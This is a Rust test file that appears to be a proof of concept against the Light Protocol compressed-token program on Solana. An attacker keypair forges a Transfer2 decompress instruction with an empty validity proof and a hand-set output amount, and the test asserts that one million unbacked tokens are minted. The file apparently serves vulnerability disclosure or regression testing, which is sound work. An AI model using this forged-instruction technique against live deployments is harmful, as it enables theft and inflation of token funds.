#![allow(clippy::result_large_err)]
#![allow(clippy::to_string_in_format_args)]
#![allow(clippy::unwrap_or_default)]

use anchor_spl::token_2022::spl_token_2022::state::Account as SplAccount;
use light_compressed_token_sdk::{
    compressed_token::{
        transfer2::{
            account_metas::Transfer2AccountsMetaConfig, create_transfer2_instruction,
            Transfer2Config, Transfer2Inputs,
        },
        CTokenAccount2,
    },
    ctoken::{derive_ctoken_ata, CompressibleParams, CreateAssociatedTokenAccount},
    ValidityProof,
};
use light_program_test::{LightProgramTest, ProgramTestConfig};
use light_sdk::instruction::PackedAccounts;
use light_test_utils::{
    airdrop_lamports,
    spl::{create_mint_helper, mint_spl_tokens},
};
use solana_sdk::{signature::Keypair, signer::Signer, transaction::Transaction};
use solana_sdk::program_pack::Pack;
use light_program_test::Rpc;

#[tokio::test]
async fn test_transfer2_ctoken_decompress_mints_unbacked_tokens() {
    // Use the standard v2 test harness so decompression paths are available.
    let mut rpc = LightProgramTest::new(ProgramTestConfig::new_v2(true, None))
        .await
        .unwrap();
    let payer = rpc.get_payer().insecure_clone();
    let attacker = Keypair::new();
    airdrop_lamports(&mut rpc, &attacker.pubkey(), 1_000_000_000)
        .await
        .unwrap();

    // Create an ordinary SPL mint and mint real tokens only into an attacker-owned SPL ATA.
    let mint = create_mint_helper(&mut rpc, &payer).await;
    let attacker_spl_account = Keypair::new();
    light_test_utils::spl::create_token_2022_account(
        &mut rpc,
        &mint,
        &attacker_spl_account,
        &attacker,
        false,
    )
    .await
    .unwrap();
    mint_spl_tokens(
        &mut rpc,
        &mint,
        &attacker_spl_account.pubkey(),
        &payer.pubkey(),
        &payer,
        1,
        false,
    )
    .await
    .unwrap();

    // Create a compressible ctoken ATA for the attacker (starts with 0 balance).
    let (ctoken_ata, bump) = derive_ctoken_ata(&attacker.pubkey(), &mint);
    let create_ctoken_ix = CreateAssociatedTokenAccount {
        idempotent: false,
        bump,
        payer: payer.pubkey(),
        owner: attacker.pubkey(),
        mint,
        associated_token_account: ctoken_ata,
        compressible: Some(CompressibleParams::default()),
    }
    .instruction()
    .unwrap();

    rpc.create_and_send_transaction(&[create_ctoken_ix], &payer.pubkey(), &[&payer])
        .await
        .unwrap();

    // Ensure the ctoken account starts empty.
    let initial_data = rpc.get_account(ctoken_ata).await.unwrap().unwrap();
    let initial_ctoken = SplAccount::unpack(&initial_data.data[..165]).unwrap();
    assert_eq!(initial_ctoken.amount, 0);

    // Build a forged Transfer2 instruction that decompresses directly into the ctoken ATA
    // without providing any valid compressed inputs or proof. This intentionally shows that
    // Transfer2 in Decompress mode mints unbacked tokens when no compressed deposit exists.
    let exploit_amount = 1_000_000u64;

    // Manually craft packed accounts but avoid providing any compressed inputs so the system
    // program's create_inputs_cpi_data path is skipped entirely.
    let mut packed_accounts = PackedAccounts::default();

    // Mint account (read-only)
    let mint_index = packed_accounts.insert_or_get_read_only(mint);
    // Attacker (acts as both owner and signer)
    let owner_index = packed_accounts.insert_or_get_config(attacker.pubkey(), true, false);
    // Ctoken ATA recipient
    let ctoken_index = packed_accounts.insert_or_get_config(ctoken_ata, false, true);

    // Construct an empty CTokenAccount2 and manually prime its output amount so
    // decompress_ctoken will accept the forged amount even without any backing inputs.
    let mut forged_account = CTokenAccount2::new_empty(owner_index, mint_index);
    forged_account.output.amount = exploit_amount;
    forged_account
        .decompress_ctoken(exploit_amount, ctoken_index)
        .unwrap();

    let (account_metas, _, _) = packed_accounts.to_account_metas();
    let transfer_inputs = Transfer2Inputs {
        token_accounts: vec![forged_account],
        validity_proof: ValidityProof::default(),
        transfer_config: Transfer2Config::default(),
        meta_config: Transfer2AccountsMetaConfig::new(payer.pubkey(), account_metas),
        in_lamports: None,
        out_lamports: None,
        // No output queue is needed because we never touch a real compressed state tree.
        output_queue: 0,
    };

    let exploit_ix = create_transfer2_instruction(transfer_inputs).unwrap();

    let blockhash = rpc.get_latest_blockhash().await.unwrap().0;
    // No Merkle proof, nullifier, or compression authority is supplied – the instruction
    // only contains the forged decompression metadata above.
    let exploit_tx = Transaction::new_signed_with_payer(
        &[exploit_ix],
        Some(&payer.pubkey()),
        &[&payer, &attacker],
        blockhash,
    );

    rpc.process_transaction(exploit_tx).await.unwrap();

    // The ctoken ATA balance should now reflect the forged amount even though no deposit occurred.
    let final_data = rpc.get_account(ctoken_ata).await.unwrap().unwrap();
    let final_ctoken = SplAccount::unpack(&final_data.data[..165]).unwrap();
    assert_eq!(final_ctoken.amount, exploit_amount);
}